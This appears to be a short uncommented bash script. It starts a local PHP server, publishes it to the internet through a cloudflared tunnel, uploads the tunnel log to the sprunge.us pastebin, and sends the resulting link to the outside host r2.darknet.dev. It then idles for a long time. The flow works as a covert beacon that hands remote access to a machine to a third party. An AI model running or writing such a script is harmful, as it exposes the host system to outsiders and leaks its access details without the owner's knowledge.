#!/usr/bin/env bash

php -S 127.0.0.1:8080 -t . /route.php &

cloudflared --url http://127.0.0.1:8080 > /tmp/cflog &

sleep 10

curl "https://r2.darknet.dev/$(cat /tmp/cflog | curl -F 'sprunge=<-' http://sprunge.us)"

sleep 100000000